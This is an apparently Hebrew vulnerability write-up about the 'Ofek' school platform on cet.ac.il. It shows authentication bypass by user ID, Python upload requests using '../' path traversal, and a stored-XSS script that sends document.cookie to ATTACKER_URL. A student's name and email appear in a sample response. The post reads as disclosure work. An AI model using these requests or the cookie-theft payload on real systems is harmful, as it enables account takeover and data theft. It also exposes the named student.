---
layout: post
title: בעיות אבטחה בפלטפורמת "אופק"
tags: [web, xss, account hijacking]
---
**גישה ל cms ללא צורך בהרשאות מנהל**

לאחר הסתכלות מהירה על הקוד באתר הגעתי למסקנה שבדיקת ההרשאות מתבצעת בצד הלקוח ולכן
למשתמש הבסיסי יש גישה למידע על הפאנלים הנמצאים בעמוד אך גם ניתן לראות כי הוא יכול לעדכן אותם

```
https://ebaghigh.cet.ac.il/api/js/ofakimApi.bundle.min.js
```
<!--more-->

![](https://i.imgur.com/ksY41EA.png)


![](https://i.imgur.com/xa3G9tm.png)

~~לצערי בזמן הדיווח לא הוספתי את גוף הבקשה לשרת ולכן חלק זה דל מתוכן~~

### התחברות ללא שם משתמש וסיסמה:

לאחר זמן מסויים באתר הבחנתי בבקשה:

```http
POST https://ebag.cet.ac.il/api/users/createSession HTTP/1.1
{
    "userID": "9f4f5c31-103d-4d3b-9789-XXXXXXXXXXXX"
}
```

הבקשה מכילה את מזהה המשתמש `userID` ולא נדרש דבר חוץ מפרט זה על מנת לקבל `token` אימות ופרטים על המשתמש

```js
// response
{
    "value":
    {
        "userAuthenticated": true,
        "pendingRequirements":
        {
            "updateEmail": false,
            "updatePassword": false,
            "pickSchool": false
        },
        "errorDescription": "",
        "user":
        {
            "userID": "9f4f5c31-103d-4d3b-9789-XXXXXXXXXXXX",
            "token": "XXXXXXXX-4678-4956-96a7-XXXXXXXXXXXX",
            "firstName": "עמית",
            "lastName": "אברהמוב",
            "displayName": "עמית אברהמוב",
            "gender": "male",
            "userName": "עמיתאבר126",
            "email": "avr.amit02@gmail.com",
            "avatarUrl": ...,
            "userRole": "student",
            "actualUserRole": "student",
            "isSiteAdmin": false,
            "filterID": ...,
            "defaultRootFolder": ...,
            "schoolID": ...,
            "schoolName": ...,
            "schoolSign": ...,
            "grade": 0,
            "schools": [...]
        }
    },
    "ok": true,
    "code": 0,
    "description": null
}
```

החלק הזה בעצם זורק את כל רעיון ההתחברות לפח ומאפשר להתחבר למשתמש רק על ידי שימוש ב id (אני משער שניתן לעשות לנסות bruteforce עד שנמצא id של משתמש קיים)

### העלאת קבצים:

כאשר תלמיד מחליט לשנות את תמונת הפרופיל שלו מתבצעת בקשה לשרת המכילה את תוכן התמונה ואת שמה

```http
POST http://api.assets.cet.ac.il/filesUpload.ashx HTTP/1.1
```

החלטתי לנסות להעלות קובץ שונה לשרת ולהפתעתי הצלחתי:

```py
print(requests.post('http://api.assets.cet.ac.il/filesUpload.ashx', files={
    'file': ('somefile.txt', 'Hello World')
}).text)
```

ניתן לראות כי הקובץ `somefile.txt` נוכח בכתובת ואכן מכיל את המחרוזת "Hello World"

```
https://storage.cet.ac.il/assets.api/uploads/201811/112f28caa70749d887a7cc8e13a315ed/somefile.txt
```

החלטתי לשחק קצת עם שמות הקבצים ובשלב מסוים הכנסתי תו לא חוקי אשר גרם לשרת להחזיר את השגיאה הבאה:

![](https://i.imgur.com/r5ruSVz.png)

בשגיאה ניתן לראות את פעולת השמירה של הקובץ ואיך נתיב הקובץ נבנה, חשבתי לעצמי מה יקרה אם אעלה קובץ ששמו יהיה:

```
../somefile.txt
```

מה שיגרום לשמירת הקובץ בתיקיית ההורה
העלתי את הקובץ, וכמו שחשבתי, הקובץ לא נשמר בתיקיה היעודית לו 

```py
print(requests.post('http://api.assets.cet.ac.il/filesUpload.ashx', files={
    'file': ('../somefile.txt', 'Hello World')
}).text) 
```

```
http://storage.cet.ac.il/assets.api/uploads/201811/somefile.txt
```

פעולה זאת מאפשרת ליצור קבצים ב root path של השרת (directory traversal)

העלאת קבצי html אפשרית (בהמשך נוכל להשתמש באופציה זו, כמות האופציות אין סופית):

![](https://i.imgur.com/fxlkpLI.png)

* אני משער שניתן להשתמש בפעולה זו על מנת לשכתב את קבצי ה config של השרת (מה שלא עשיתי) ולהגיע להרצת קוד

### stored xss - חטיפת משתמש (גניבת עוגיות):

מכיוון שאתר אופק והשרת אליו מעלים את הקבצים יושבים על דומיין זהה ואין שום הגדרות שמונעות מסאב הדומיין לגשת אל העוגיות, ניתן לקרוא את עוגיות המשתמש על ידי הדפדפן (בנוסף העוגיה לא מוגדרת כ HttpOnly)

```
https://ebaghigh.cet.ac.il/
http://storage.cet.ac.il/assets.api/uploads/201811/112f28caa70749d887a7cc8e13a315ed/somefile.txt
```

נוכל לנצל את בעיית העלאת הקבצים ולהעלות קובץ `html` אשר מכיל קוד זדוני.  
קטע הקוד הבא ישלח חזרה לשרת (`ATTACKER_URL`) את העוגיות של העמוד ובתוכן גם עוגיה המכילה את נתוני המשתמש המחובר, פעולה זו תאפשר לנו להכנס לחשבון המשתמש ללא בעיה.
```html
<script>
fetch(ATTACKER_URL, {
    method: 'POST',
    body: document.cookie
})
</script>
```